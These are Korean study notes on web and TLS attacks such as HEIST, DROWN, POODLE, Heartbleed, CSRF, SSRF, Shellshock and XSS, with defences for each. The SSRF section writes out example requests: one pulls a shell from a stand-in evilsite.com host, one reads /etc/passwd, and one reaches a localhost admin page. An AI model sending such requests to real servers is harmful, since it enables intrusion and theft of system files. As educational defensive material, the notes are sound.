- [HEIST(HTTP Encrypted Information can be Stolen through)](#o-heisthttp-encrypted-information-can-be-stolen-through--공격-2016년-8월-black-hat-발표)          
- [DROWN(Decrypting RSA with Obsolete and Weakened eNcryption)](#o-drowndecrypting-rsa-with-obsolete-and-weakened-encryption-공격-2016년-3월-cve-2016-0800)          
- [FREAK(Factoring attack on RSA-EXPORT Keys)](#o-freak-factoring-attack-on-rsa-export-keys-공격2015년-1월-cve-2015-0204)          
- [POODLE(Padding Oracle On Downgraded Legacy Encryption)](#o-poodlepadding-oracle-on-downgraded-legacy-encryption-공격2014년-10월-cve-2014-3566)          
- [Heartbleed 취약점](#heartbleed-취약점-2014년-4월-cve-2014-0160)          
- [Insecure Deserialization(안전하지 않은 역직렬화)](#ㅁ-insecure-deserialization안전하지-않은-역직렬화)          
- [CSRF 공격(Cross Site Request Forgery)](#ㅁ-csrf-공격cross-site-request-forgery)          
- [SSRF(Server-side Request Forgery) ](#ㅁ-ssrfserver-side-request-forgery)          
- [Shell shock](#ㅁ-shell-shock)          
- [반사 XSS Attack](#반사-xss-attack)          
- [DOM 기반 XSS Attack](#dom-기반-xss-attack)          
- [논리적 에러를 이용하는 SQL Injection](#논리적-에러를-이용하는-sql-injection)
- [Union SQL Injection](#union-sql-injection)
- [Blind SQL Injection](#blind-sql-injection)
- [저장 프로시저를 이용하는 Stored Procedure SQL Injection](#저장-프로시저를-이용하는-stored-procedure-sql-injection)
- [Time basedd SQL Injection](#time-basedd-sql-injection)
- [Error based SQL injection](#error-based-sql-injection)
- [XXE(XML eXternal Entity, XML 외부 엔티티)](#ㅁ-xxexml-external-entity-xml-외부-엔티티)
- [파일 인클루전(file inclusion) 공격](#ㅁ-파일-인클루전file-inclusion-공격)          
- [DNS 증폭 공격(Amplification Attack)](#ㅁ-dns-증폭-공격amplification-attack)          
- [NTP 증폭 DRDoS 공격(Amplification Attack )](#ntp-증폭-drdos-공격amplification-attack)          
- [SSDP Amplification DDoS](#ㅁ-ssdp-amplification-ddos)          
- [VSE Query Flooding](#ㅁ-vse-query-flooding)          
- [GRE Flooding](#ㅁ-gre-flooding)          
- [Tsunami Syn Flooding](#ㅁ-tsunami-syn-flooding)          
- [SYN Flooding](#ㅁ-syn-flooding)          
- [UDP Flooding](#ㅁ-udp-flooding)          
- [ICMP Flooding](#ㅁ-icmp-flooding)          
- [CLDAP DDoS Attack](#ㅁ-cldap-ddos-attack)          
- [TCP Connection Flooding](#ㅁ-tcp-connection-flooding)          
- [Slow HTTP POST DoS  ](#ㅁ-slow-http-post-dos)          
- [Slow HTTP Header DoS](#ㅁ-slow-http-header-dos)   
- [Slow HTTP Read DoS](#ㅁ-slow-http-read-dos)
- [TCP Syn Flooding](#ㅁ-tcp-syn-flooding)
- [DNS Spoofing Attack](#ㅁ-dns-spoofing-attack)          
- [HTTP GET Flooding](#ㅁ-http-get-flooding)          
- [SlowHTTP GET Flooding](#ㅁ-slow-http-get-flooding)
- [DNS 캐시 포이즈닝 (Cache Poisoning)](#ㅁ-dns-캐시-포이즈닝-cache-poisoning)          
- [DNS를 활용한 증폭 DrDoS](#ㅁ-dns를-활용한-증폭-drdos)          
- [회선 태핑(Tapping) 공격](#ㅁ-회선-태핑tapping-공격)          
- [템페스트(Tempest) 공격](#ㅁ-템페스트tempest-공격)          
- [VLAN 홉핑 공격](#ㅁ-vlan-홉핑-공격)          
- [DHCP 스푸핑 공격](#ㅁ-dhcp-스푸핑-공격)          
- [본크·보인크(Bonk·Boink) 공격](#ㅁ-본크보인크bonkboink-공격)          
- [Tiny Fragment Attack](#ㅁ-tiny-fragment-attack)          
- [Fragment Overlap Attack](#ㅁ-fragment-overlap-attack)          
- [세션 하이재킹](#ㅁ-세션-하이재킹)          
- [Smishing](#ㅁ-smishing)          
- [Spear Phishing](#ㅁ-spear-phishing)          
- [Qshing](#ㅁ-qshing)          
- [파일 업로드 공격 ](#ㅁ-파일-업로드-공격)          
- [Ping of death ](#ㅁ-ping-of-death)          
- [John The Ripper ](#ㅁ-john-the-ripper)          
- [스턱스 넷](#ㅁ-스턱스-넷)          
- [DHCP Starvation](#ㅁ-dhcp-starvation)          
- [ARP Spoofing](#ㅁ-arp-spoofing)          
- [ARP Redirect](#ㅁ-arp-redirect)          
- [ICMP Redirect](#ㅁ-icmp-redirect)     
- [Smurf Attack](#ㅁ-smurf-attack)
- [Land Attack](#ㅁ-land-attacklocal-area-network-denial-attack)
- [DHCP 스푸핑 공격(DHCP Spoofing Attack)](#ㅁ-dhcp-스푸핑-공격dhcp-spoofing-attack)
- [DHCP Starvation](#ㅁ-dhcp-starvation)
- [Hash Dos](#ㅁ-hash-dos)
- [Hulk Dos](#ㅁ-hulk-dos)
- [Dos vs DDoS vs DRDOS](#ㅁ-dos-vs-ddos-vs-drdos)






---

### ㅁ MIME 타입   

***
: MIME 타입이란 클라이언트에게 전송된 문서의 다양성을 알려주기 위한 메커니즘   
웹에서 파일의 확장자는  의미X 각 문서와 함께 올바른 MIME 타입을 전송하도록, 
서버가 정확히 설정하는 것이 중요
- Type: text, image, audio, video, application

> - Image Type: image/ gif, jpeg, png, svg+xml   
> - Aduio Type: audtio/ wave, wav, x-wav, x-pn-wav, webm, ogg   
> - Video Type: video/ webm, ogg   
> - Application Type: application/ ogg   

<br>

- 서버측에 있는 프로그램을 서버 사이드 프로그램
- 서버 사이드 스크립트는 프로그램 중에서도 스크립트 형태의 프로그램



<br>
<br>

***
 #### ㅁ SSL/TLS
 - SSL(Secure Sockets Layer)
 - TLS(Transport Layer Escurity)
: 네트워크 통신 환경에서 주고받는 데이터를 암호화 해주는 규약(다양한 애플리케이션에서 암호화된 통신을 위해 사용)

ㅁ SSL/TLS 주요 보안 이슈
### o HEIST(HTTP Encrypted Information can be Stolen through  공격 (2016년 8월, Black Hat 발표)

: 브라우저에 대한 사이드-채널 공격(side-channel attack)(8)을 통해 SSL/TLS로 암호화된 데이터의 정확한 크기를 알아내는 공격   

이미 알려진 이전 공격과 HEIST의 차이점은 중간자 공격(man-in-the-middle attack, MITM)(9) 없이 사용자의 브라우저만 있으면 웹사이트의 광고 등에 몰래 숨겨 놓은 악성 JavaScript를 이용하여 공격 가능    

HEIST를 이용하여 암호화된 데이터 크기를 정확히 알아내기만 하면 압축-기반 공격(compressionbased attack)(10)이나 크기-노출 공격(size-exposing attack) 등에 취약해져 사용자계정, 패스워드, 의료데이터 등 민감한 정보가 탈취될 가능성이 높아짐      

JavaScript의 Fetch API(데이터 전송 시작)와 타이밍 API(데이터 전송 종료)를 사용하면 첫 번째 TCP window(11) 안에 암호화된 데이터가 전송 완료되었는지 아니면 두 번째 TCP window 안에 전송 완료 되었는지를 알아낼 수 있음           

<br>

### o DROWN(Decrypting RSA with Obsolete and Weakened eNcryption) 공격 (2016년 3월, CVE-2016-0800)
: RSA 키교환 단계에서 암호화된 세션키(서버와 클라이언트 간 데이터를 암호화하는 대칭키)를 해독하는 공격   
 
SSL 2.0 프로토콜에서 사용된 RSA 개인키(private key)와 동일한 개인키를 사용하는 RSA 키교환 기반의 TLS 연결은 DROWN 공격에 의해 암호화된 통신이 해독될 수 있음

DROWN 공격은 SSL 2.0에서 사용한 RSA 개인키를 유출하는 것이 아니라 Bleichenbacher RSA패딩 오라클 공격을 통해 암호화된 세션키를 해독함

SSL 2.0과 동일한 개인키를 사용하는 RSA 키교환 기반의 TLS 연결은 해독된 세션키를 이용하여 복호화 할 수 있기 때문에 클라이언트와 서버 간 비밀 통신을 엿볼 수 있음

![image](https://user-images.githubusercontent.com/62640332/136651311-3750ddce-806b-48e2-bb0f-be38a56d9c40.png)

<br>

### o FREAK (Factoring attack on RSA-EXPORT Keys) 공격(2015년 1월, CVE-2015-0204)
: 공격자는 중간자 공격(man-in-the-middle attack, MITM)을 통해 SSL 연결시 보안이 취약한 “수출 등급” RSA 알고리즘을 사용하도록 유도한 후 brute-force 공격(14)으로 RSA키를 알아내는 공격

과거 미국에서는 자국 소프트웨어 수출시 암호화 수준을 낮추도록 규제하였는데 이를 “수출 등급(export-grade)” 암호화 알고리즘이라 함

RSA_EXPORT는 512비트의 암호화키를 사용하는 수출 등급의 RSA 암호화 알고리즘으로서 현재 주로 사용되는 2,048비트 이상의 암호화키에 비해 brute-force 공격에 취약

![image](https://user-images.githubusercontent.com/62640332/136651398-33bffaed-0a8d-4c24-932e-fbebe2f548a7.png)

- OpenSSL 0.9.8zd 이전 버전과 OpenSSL 1.0.0 ~ 1.0.0p 버전, OpenSSL 1.0.1 ~ 1.0.1k 버전 등이 취약하기 때문에 최신 버전으로 패치해야 함
- 패치가 적용되기 전까지는 “RSA_EXPORT Cipher Suites” 비활성화 필요


<br>

### o POODLE(Padding Oracle On Downgraded Legacy Encryption) 공격(2014년 10월, CVE-2014-3566)
: SSL 3.0은 Netscape사가 웹에서 암호화된 통신을 위해 1996년 발표한 스펙으로써 [패딩 오라클 공격(Padding Oracle Attack)](https://bperhaps.tistory.com/entry/%EC%98%A4%EB%9D%BC%ED%81%B4-%ED%8C%A8%EB%94%A9-%EA%B3%B5%EA%B2%A9-%EA%B8%B0%EC%B4%88-%EC%84%A4%EB%AA%85-Oracle-Padding-Attack)에 취약하여 2015년 RFC 7568에 의해 공식적으로 사용 제한(DEPRECATED) 됨

POODLE 공격은 SSL 3.0의 CBC(Cipher Block Chaining) 암호 모드의 취약점을 통해 패딩 오라클 공격을 수행하여 주고받는 암호문을 해독할 수 있음
 
- 공격자는 SSL 3.0의 패딩 오라클 취약점을 이용하기 위해 중간자 공격을 통해 TLS 연결 시도를 모두 무시(drop)하고 SSL 3.0 연결을 유도함
 
 SSL 3.0으로 연결되면 자바스크립트를 이용하여 브라우저가 특정 사이트의 인증정보(쿠키, 토큰 등)를 탈취할 수 있으며 패딩 오라클 공격으로 암호문을 해독할 수 있음

> ![image](https://user-images.githubusercontent.com/62640332/136651577-d36e5c48-ed47-4600-bb91-603e05148a56.png)

> - POODLE 공격을 대처하는 최선책은 더 이상 SSL 프로토콜을 지원하지 않는 것
> - 서버는 웹서버 설정을 통해 SSL 3.0 프로토콜 미지원 조치
> - 클라이언트는 브라우저 설정을 통해 SSL 3.0 연결 제한 조치

<br>

### Heartbleed 취약점 (2014년 4월, CVE-2014-0160)
: HeartBeat는 서버와 클라이언트 사이에 무슨 문제는 없는지 또는 안정적인 연결을 유지하기 위한 목적으로 일정 신호를 주고 받을 때 사용하는 확장규격입니다.

클라이언트는 HeartBeat 확장프로토콜을 이용하여 임의의 정보를 그 정보의 길이와 함께 서버에 전송합니다. 

그 후 서버는 전달받은 정보를 다시 클라이언트에 전달해 주는 과정을 통해 자신의 존재 사실을 알려줍니다. 

이 때 클라이언트로부터 전달받은 정보와 그 정보의 길이가 일치하지 않는다면, 클라이언트의 요청에 서버는 응답을 하지 않는 것이 정상적인 동작입니다. 

이번에 발견된 HeartBleed 취약점은 서버가 클라이언트로부터 전달받은 정보의 내용과 그 정보의 길이의 일치 여부를 검증하지 않은 채 정보를 보내주면서 문제가 발생된 것입니다.

클라이언트는 한번에 최대 64KB의 정보를 요청할 수 있습니다. 실제로 64KB에 들어갈 수 있는 정보는 매우 작습니다. 

그러나 해당 취약점을 이용하여 시스템 메모리에 저장되어 있는 무의미한 작은 정보들을 지속적으로 유출시키면, 이러한 무의미한 정보들이 모여 하나의 완전한 유의미한 정보가 될 수 있습니다. 

이러한 과정을 통하여 공격자는 시스템 메모리에 저장되어 있는 정보들을 유출시킬 수 있으며, 이 정보들에는 개인키, 관리자 정보 등 민감한 정보들도 포함되어 있습니다.

특히 개인키의 경우 암호화하여 전달되는 데이터를 모두 열람할 수 있는 핵심정보이기 때문에 사안이 매우 심각하다고 할 수 있습니다.

HeartBleed 명칭의 유래는 해당 취약점으로 공격할 때마다 작은 정보들이 새어 나오는 것을, 심장이 한번씩 뛸 때마다(HeartBeat) 심장에서 피가 한 방울씩 떨어지는 치명적인 심장출혈(HeartBleed)로 비유하여 명명한 것입니다.


![image](https://user-images.githubusercontent.com/62640332/162602988-0e3fa605-2251-4e1a-93ab-1889104f9fb4.png)


```
ㅁ 영향받는 버전 
OpenSSL 1.0.1 ~ OpenSSL 1.0.1f
OpenSSL 1.0.2-beta, OpenSSL 1.0.2-beta1

ㅁ 영향받지 않는 버전

OpenSSL 1.0.1g
OpenSSL 1.0.0대 버전
OpenSSL 0.9.8대 버전
```


- Heartbleed 취약점에 노출된 경우, SSL 인증서를 무효화(revoke)하고 재발행해야 함
- OpenSSL 버전을 1.0.1g 버전으로 업데이트
- 운영환경의 특수성 때문에 패키지 형태의 업데이트가 어려운 경우, Heartbeat를 사용하지 않도록 컴파일 옵션을 설정하여 재컴파일 가능



<br>
<br>

***
#### ㅁ Insecure Deserialization(안전하지 않은 역직렬화)

![image](https://user-images.githubusercontent.com/62640332/162603082-df4d263f-98bd-4b6a-b605-818a14739821.png)

- 직렬화(Serialization) : 서로간에 원활한 통신을 위하여 객체를 직렬 화하여 객체들의 데이터를 -> 연속적인 데이터로 변형하여 Stream을 통해 데이터를 읽도록 해준다.(전송 가능한 형태로 변환)
> - 객체들을 통째로 파일로 저장하거나 전송시 사용

- 역직렬화(Deserialization) : 직렬화된 파일 등을 역으로 직렬화하여 다시 객체의 형태로 변환
(저장된 파일을 읽거나 전송된 Stream 데이터를 읽어 원래 객체의 형태로 복원)

- 공격의 발생 원인
  >1. 애플리케이션 및 API가 공격자의 악의적이거나 변조된 객체를 역직렬화하면 취약해질 수 있습니다.
  >2. 공격자가 애플리케이션 로직을 수정하거나 애플리케이션에 사용 가능한 클래스가 있는 경우 임의의 원격코드를 실행하여 역직렬화 중이나 이후에 동작을 변경할 수 있습니다. 
  >3. 기존 데이터 구조가 사용되지만 내용이 변경되는 일반적인 데이터 변조 공격

- 대응 방법 
  > 1. 신뢰할 수 없는 출처로부터 직렬화된 객체 차단
  > 2. 원시 데이터 유형만을 허용하는 직렬화 매체를 사용
  > 3. 악성 객체 생성이나 데이터  변조를 방지하기 위해 직렬화된 객체에 대한 디지털 서명과 같은 무결성 검사를 구현
  > 3. 객체 생성 전 코드가 일반적으로 정의하는 클래스 집합을 기대하므로 역 직렬화에 대한 엄격한 형식 제약조건 적용
  > 4. 역직렬화 하는 컨테이너 또는 서버에서 들어오고 나가는 네트워크 연결을 제한하거나 모니터링 필터링하여 차단

[ㅁ 안전하지 않은 역직렬화 예시](https://shineild-security.tistory.com/15)

<br>
<br>

#### ㅁ CSRF 공격(Cross Site Request Forgery)
: 웹 어플리케이션 취약점 중 하나로 인터넷 사용자(희생자)가 자신의 의지와는 무관하게 공격자가 의도한 행위(수정, 삭제, 등록 등)를 특정 웹사이트에 요청하게 만드는 공격입니다.   

CSRF를 통해 해커는 희생자의 권한을 도용하여 중요 기능을 실행하는 것이 가능   

CSRF 공격이 이뤄지려면 다음 조건이 만족되어야 합니다.    

> 1. 위조 요청을 전송하는 서비스(페이스북)에 희생자가 로그인 상태       
> 2. 희생자가 해커가 만든 피싱 사이트에 접속      
   
ㅁ대응 방법  

1. Referrer 검증      

: Back-end 단에서 request의 referrer를 확인하여 domain (ex. *.facebook.com) 이 일치하는 지 검증하는 방법   

2. Security Token 사용       

: 사용자의 세션에 임의의 난수 값을 저장하고 사용자의 요청 마다 해당 난수 값을 포함 시켜 전송시킵니다. 이후 Back-end 단에서 요청을 받을 때마다 세션에 저장된 토큰 값과 요청 파라미터에 전달되는 토큰 값이 일치하는 지 검증하는 방법

3. Double Submit Cookie 검증      

: 웹브라우저의 Same Origin 정책으로 인해 자바스크립트에서 타 도메인의 쿠키 값을 확인/수정하지 못한다는 것을 이용한 방어 기법입니다.   

[ㅁ SOP 와 CORS](https://velog.io/@yejinh/CORS-4tk536f0db)

스크립트 단에서 요청 시 난수 값을 생성하여 쿠키에 저장하고 동일한 난수 값을 요청 파라미터(혹은 헤더)에도 저장하여 서버로 전송합니다.    

서버단에서는 쿠키의 토큰 값와 파라미터의 토큰 값이 일치하는 지만 검사하면 됩니다.    

서버에 따로 토큰 값을 저장할 필요가 없어 위에서 살펴본 세션을 이용한 검증보다 개발 공수가 적은 편입니다.    

피싱 사이트에서는 도메인이 달라 facebook.com 쿠키에 값을 저장하지 못하므로 (조금 전에 언급한 Same Origin 정책) 가능한 방어 기법

[ㅁ referer 이란 무엇인가?](https://github.com/sungmin4036/infomation_security/blob/main/etc/referer%EC%A0%95%EC%9D%98.md)

[ㅁ CSRF 예시](https://gomguk.tistory.com/72)


<br>
<br>

***

#### ㅁ SSRF(Server-side Request Forgery)    
: 서버 측 요청 위조(Server-Side Request Forgery, SSRF) 공격은 공격자가 서버를 속여 무단 요청을 보내도록 유도하는 수법이다. 

공격 이름으로 짐작할 수 있듯, 원래 서버가 하는 요청을 공격자가 위조하는 것을 의미한다.

SSRF 공격은 사이트 간 요청 위조(Cross-Site Request Forgery, CSRF) 공격보다 훨씬 더 위험하다. 

CSRF 공격은 공격자가 사용자의 웹 브라우저를 하이재킹해 사용자를 대신해 무단 작업을 수행하는 방식이다. 

CSRF의 악의적인 활동은 클라이언트 측에서 진행되는데, 클라이언트는 일반적으로 개별 사용자 또는 공격 대상이 된 이들의 자산이다. 

물론 공격을 받는 사람에게 웹 애플리케이션에 대한 관리자 권한이 있다면 전체 애플리케이션이 침해될 수 있으므로 CSRF도 위험해질 수 있다. 

반면 SSRF 공격은 중간에 사용자를 개입시킬 필요 없이 웹 서버 자체를 노린다. 공격자는 악성 HTTP 요청을 서버에 보내는 것만으로 백엔드에 지시해 악성 작업을 수행할 수 있다.

- http request 처리되는 순서

![image](https://user-images.githubusercontent.com/62640332/161368300-d4fd123d-e4d7-40f3-87c3-d8cd4fe83701.png)

기본적으로 서비스는 누구나 접속할 수 있는 web server와, 인가된 소수의 인원들만 접속할 수 있는 DB server가 보통 구분되어있습니다.          

위 그림에서 볼 수 있는 것처럼 외부인이 정보를 요구한다면 web server와 db server가 통신을 하여 그 결과, 즉 response를 사용자에게 다시 전달하는 방식으로 이루어집니다.           

이때 SSRF취약점은 web server가 db server와 소통한다는 점에 초점을 둔 취약점            

> 파란색 서버가 web server인 xyz.com이고, 빨간색 서버는 ip가 10.0.0.1인 db서버                

우리가 단순히 자신의 브라우저로 각각 xyz.com과 10.0.0.1에 접속하려고 한다면, xyz.com은 당연히 접근이 가능할 것이고, 10.0.0.1이라는 ip는 접근이 불가능할 것입니다.         

10.0.0.1이라는 ip가 접근이 안되는 이유는 xyz.com의 내부망(intranet)에 연결되어있는 서버이기 때문입니다.             

그러나 다음과 같은 링크를 보내면 내부망에 접속할 수 있습니다.               

```
GET https://xyz.com/id?content=http://10.0.0.1/
```
이런 식으로 요청을 보내면 xyz.com의 입장에서 10.0.0.1에 접근하는 것이기 때문에 외부의 사람도 내부망에 접근할 수 있게 되는 것입니다. 

ㅁ 대표적인 공격

1) RFI

```
GET https://xyz.com/id?content=https://evilsite.com/shell.php
``` 

2) LFI

```
GET https://xyz.com/id?content=file:///etc/passwd
```

3) 비인가 접근

```
GET https://xyz.com/id?content=http://localhost/administrator
```


1. 사용자의 입력값으로 URL을 받아서 처리하는 서비스의 경우 잠재적으로 SSRF 취약점이 존재

2.  Referer 헤더의 링크를 통해서 정보를 수집하고 통계에 이용하는 경우가 있다. Referer 링크에서 요청하고 meta 데이터들을 읽거나 페이지를 읽어서 내부 데이터로 이용하는 경우가 있는데 이 때도 역시 SSRF는 발생 가능하다.

3.  데이터를 XML로 전송할 경우 XXE Inejction을 통해서 SSRF를 트리거할 수도 있다

4.  Open Redirection 취약점이 있을 때 경우에 따라 SSRF를 트리거할 수 있다.

ㅁ 대응방법

1. 입력값을 블랙리스트 방식으로 필터링

2. 입력값을 화이트리스트 방식으로 필터링한다. (허용된 도메인과 URL에 대해서만 허용)

3. URL 검사할 때 단순히 문자열 포함여부를 검사하지 않고 정규식을 활용하며 정확히 host domain을 검사하도록 하고 @나 #기호를 이용해 우회할 수 없도록 기능을 막거나 필터링

4. 서버 내부 정보나 내부 네트워크의 정보가 빠져나가지 않도록 비록 내부 네트워크에서의 접근이라도 중요한 데이터일 경우 추가 인증을 받도록 해서 SSRF 취약점이 있어도 피해가 발생하지 않도록 한다.

5. 요청을 처리하는 서버와 중요 정보가 있는 내부망을 분리

6. 요청한 URL에 대한 응답 값이 예상한 값인지를(응답이 이미지인지 동영상인지 등) 검사할 수도 있다. 하지만 이 경우 404, 403과 같은 에러코드가 응답되면서 서버 내부 ip 혹은 포트스캔에 이용될 수 있으니 URL에 대한 추가적인 필터링이 필요

7. http나 https를 제외하고 사용하지 않는 URI scheme은 비활성화하거나 필터링한다.



> \# Blind SSRF
>  블라인드(Blind) SSRF 공격은 반드시 데이터를 반환하는 것은 아니며, 그 대신 서버 백엔드에 무단 작업을 수행하는데 초점을 둔다. 
> 
> 블라인드 SSRF 공격에서 공격자는 데이터 유출보다는 예를 들어 서버의 무언가를 변경하거나, 
> 
> 파일을 수정 또는 삭제하거나 권한을 바꾸거나 그 외의 다양한 무단 작업을 실행하는데 초점을 두고 있다.
> 
> 앞의 예시에서 URL을 수정해 shop.example.com/?url=http://example.com/some-very-large-file.png로 이동하도록 했다고 가정해 보자. 
> 
> 여기서 서버는 외부 서버에서 비정상적으로 용량이 큰 파일을 가져오기 위해 계속 시도한다. 
> 
> 이 요청은 shop.example.com의 웹 서버를 멈추게 하고 서비스 거부(DoS)로 이어질 수 있다. 
> 
> 가시적인 응답이나 데이터를 끌어내는 것이 아니라 서버를 대신해 유해한 작업을 수행하는데 초점을 둔다는 점에서 
> 
> 이 유형의 SSRF 공격을 '블라인드' SSRF라고 한다.

[ㅁ SSRF 실제 공격 예시](https://guleum-zone.tistory.com/165)   
[ㅁ SSRF 상세한 내용](https://www.itworld.co.kr/howto/211794)

<br>
<br>

***

#### ㅁ Shell shock

: 리눅스 계열 OS에서 주로 사용하는 GNU Bash에서 공격자가 원격에서 악의적인 시스템 명령을 실행 할 수있는 취약점.

![image](https://user-images.githubusercontent.com/62640332/162605750-15d653d3-d90a-405e-9224-0c20d64857d9.png)

취약점이 없느 상황이라면 뒤에 echo test는 출력이 되어서는 안된다.


쉘쇼크로 인해 가장 영향을 받는 프로그램은 CGI(Common Gateway Interface).

```
- CGI(Common Gateway Interface).
: 웹 서버에 요청된 페이지를 응용프로그램에 전달하고 처리하기 위한 인터페이스

CGI 자세한 설명: https://live-everyday.tistory.com/197
```

- 취약점이 발생한 부분은 Bash쉘이 제공하는 함수 선언 기능.

"0 {"로 시작하는 문자열을 시스템 환경변수에 저장하면 동일한 이름을 가진 함수로 선언된다.

하지만 함수 선언문 끝에 임의의 명령어를 추가로 삽입할 경우, Bash가 함수문에서 처리를 멈추지 않고 추가로 삽입한 명령어를 계속 실행 시키기 때문에 문제가 발생.

![image](https://user-images.githubusercontent.com/62640332/136659841-85d9782a-e7a1-44ae-a98e-b326fda65daf.png)

Bash의 소스코드 분석 시, evalstring.c 파일 내에 정의되어 있는 parse_and_execute() 함수에서 Bash에 전달된 명령어를 처리하여 실행

명령어 문자열을 처리하는 과정에서 반복문(while)을 사용하는데, 함수 선언문 뒤에 명령어가 삽입된 것을 확인하고 반복문을 종료시키는 코드가 없음.    
따라서 함수 선언문의 끝까지 처리한 뒤에도 반복문이 계속 실행되어 삽입된 명령어가 실행.

![image](https://user-images.githubusercontent.com/62640332/136659878-3186c0d7-779e-468f-8104-eaa5dd48d3f5.png)

`만약 외부로부터 환경변수를 전달받아 Bash 쉘을 통해 명령어를 실행하는 서버가 존재하면, 공격자는 함수 선언문 뒤에 임의의 명령어를 삽입시켜 해당 프로세스의 권한으로 실행 시킬 수 있음.`

직접적으로 명령어 주입이 가능한 취약점이기에 ASLR(Address Space Layout Randomization) 등의 OS 보호 매커니즘에 전혀 영향을 받지 않아 공격 성공률이 매우 높음.


![image](https://user-images.githubusercontent.com/62640332/136659923-4805defc-9257-4313-b2cc-006fd927b416.png)

ㅁ 대응 방법       

1. Bash 업데이트               
2. 사용하지 않는 CGI 페이지 삭제 또는 관련 서비스 중지.              
3. 네트워크 탐지룰 설정.          

***

<br>
<br>

#### ㅁ XSS(Cross Site Scripting)

> \# HTTP 프로토콜
>
> 웹 서버와 클라이언트간 서버에 저장된 웹 문서(일반적으로 HTML, 스크립트, 이미지(.gif, .jpeg)등을 클라이언트로 전달하기 위한 표준규약.
>
> 먼저 클라이언트(브라우저)는 서버로 헤더 정보를 포함하여 관련 정보를 요청(request)하면, 웹 서버는 클라이언트의 요청을 분석하여 요청한 자원 데이터 및 헤더를 포함하여 클라이언트로 응답(response)을 보냄.

<br>

: XSS는 애플리케이션에서 브라우저로 전송하는 페이지에서 사용자가 입력하는 데이터를 검증하지 않거나, 출력 시 위험 데이터를 무효화 시키지 않을 때 발생

공격자가 의도적으로 브라우저에서 실행될 수 있는 악성 스크립트를 웹 서버에 입력 또는 이것을 출력시 위험한 문자를 중성화시키지 않고 처리하는 애플리케이션의 개발 과정에서 발생.

XSS는 일반적으로 자바스크립트에서 발생하지만, VB 스크립트, ActiveX 등 클라이언트에서 실행되는 동적 데이터를 생성하는 모든 언어에서 발생 가능.

<br>

ㅁ XSS공격 종류

### - 저장 XSS Attack 

: 접속자가 많은 웹 사이트를 대상으로 공격자가 XSS 취약점이 있는 웹 서버에 공격용 스크립트를 입력시켜 놓으면,

방문자가 악성 스크립트가 삽입되어 있는 페이지를 읽는 순간 방문자의 브라우저를 공격하는 방식.

1. 웹 애플리 케이션 취약점이 있는 웹 서버에 악성 스크립트를 영구적으로 저장해 놓는 방법.

2. 이 때 웹 사이트의 게시판, 사용자 프로필 및 코멘트 필드 등에 악성 스크립트를 삽입해 놓으면,     
   사용자가 사이트를 방문하여 저장되어 있는 페이지에 정보를 요청할 때,     
   서버는 악성 스크립트를 사용자에게 전달하여 사용자 브라우저에서 스크립트가 실행되면서 공격한다.

3. 가장 일반적인 방법은 게시판 같은 곳에 HTML 문서에 \<script>를 이용하여 이 스크립트 태그 안에 악성 스크립트를 저장하는 방식.

4. 저장 XSS는 공격자 입장에서 사용자들이 많이 방문하는 사이트가 공격 대상으로 가장 적합한 곳.

<br>

### - 반사 XSS Attack

: 악성 스크립트가 포함된 URL을 사용자가 클릭하도록 유도하여 URL을 클릭하면 클라이언트를 공격.

1. 웹 애플리케이션의 지정된 변수를 이용할 때 발생하는 취약점을 이용하는 것으로,   
    검색 결과, 에러 메시지 등 서버가 외부에서 입력받은 값을 받아 브라우저에게 응답할 때 전송하는 과정에서    
    입력되는 변수의 위험한 문자를 사용자에게 그대로 돌려주면서 발생.

![image](https://user-images.githubusercontent.com/62640332/136660269-f6bc4b8b-8d4c-47c8-98b8-28a844daa650.png)

2. 일반적으로 서버에 검색 내용을 입력하면, 검색 결과가 있는 경우에는 결과 값을 사용자에게 전달 하지만    
   서버에서 정확한 결과가 없는 경우 서버는 브라우저에 입력한 값을 아래의 <그림>과 같이 그대로 HTML문서에 포함하여 응답.

![image](https://user-images.githubusercontent.com/62640332/136660274-bbebd210-6f1a-4d4d-afdc-1319ec2cad1b.png)


3. 이 경우 HTML페이지에 포함된 악성 스크립트가 브라우저에서 실행.   
> So, 사용자가 서버로 입력 한 값을, 서버는 요청한 사용자의 브라우저로 악성스크립트를 반사시킴.   

4. 반사 XSS공격은 주로 사용자에게 악성 URL을 배포하여 사용자가 클릭하도록 유도하여 클릭한 사용자를 바로 공격.   
> So, 사용자는 악성 스크립트가 포함된 링크를 클릭한 순간 바로 악성 스크립트가 사용자의 브라우저에서 실행.   

5. 반사 XSS공격은 이메일 메시지 또는 다른 웹 사이트와 같이 다양한 경로로 피해자 시스템에게 전달.   
 

<br>
<br>

### DOM 기반 XSS Attack

> DOM환경에서 악성 URL을 통해 사용자의 브라우저를 공격.       
1. DOM(Document Object Model)이란 W3C 표준으로 HTML 및 XML 문서에 접근방법을 표준으로 정의하는 문서객체 모델.                             
> W3C에서는 DOM을 '프로그램 및 스크립트가 문서의 컨텐츠, 구조 및 형식을 동적으로 접근 및 업데이트 할 수 있도록 하는 언어 중립적인 인터페이스이다' 라고 정의.                             
> DOM은 HTML문서를 계층적으로 보면서 컨텐츠를 동적으로 변경할 수 있다.                         
2. DOM 기반 XSS 공격은 피해자의 브라우저가 HTML페이지를 구문분석할 때마다 공격 스크립트가 DOM 생성의 일부로 실행되면서 공격.                                          
3. 페이지 자체는 변하지 않으나, 페이지에 포함되어 있는 브라우저 측 코드가 DOM환경에서 악성코드로 실행.                       
4. 저장 XSS 및 반사 XSS공격의 악성 페이로드가 서버 측 애플리케이션 취약점으로 인해, 응답 페이지에 악성 스크립트가 포함되어 브라우저로 전달되면서 공격하느 것인 반면,                    
 DOM 기반 XSS는 서버와 관계없이 브라우저에서 발생하는 것이 차이점.                       
6. 일반적으로 DOM 기반 XSS 취약점은 브라우저를 대상으로 조작된 URL을 이메일을 통해 사용자에게 전송하면, 이 URL링크를 클릭하는 순간 공격 피해를 입게 됨                           

ㅁ 대응 방법

ⅰ] 입,출력 값 검증 및 무효화    

1. XSS 취약점을 근본적으로 제거하기 위해서는 스크립트 등 해킹에 사용될 수 있는 코딩에 사용되는 입력 및 출력 값에 대해서 검증하고 무효화시켜야함. 

2. 입력 값에 대한 유효성 검사는 데이터가 입력되기 전에 가능하면, 입력 데이터에 대한 길이, 문자, 형식 및 사업적 규칙 유효성을 검사.

3. 출력값을 무효화하기 위해서는 XSS공격은 기본적으로 \<script>태그를 사용하기 때문에 XSS공격을 차단하기 위해 태그 문자(<,>) 등 위험한 문자 입력 시 문자 참조(HTML entitiy)로 필터링하고, 서버에서 브라우저로 전송 시 문자를 인코딩.

4. 서버에서 브라우저로 전송 시 문자를 인코딩.               
\# HTML 문자 참조 : ASCII문자를 동일한 의미의 HTML문자로 변경하는 과정.         
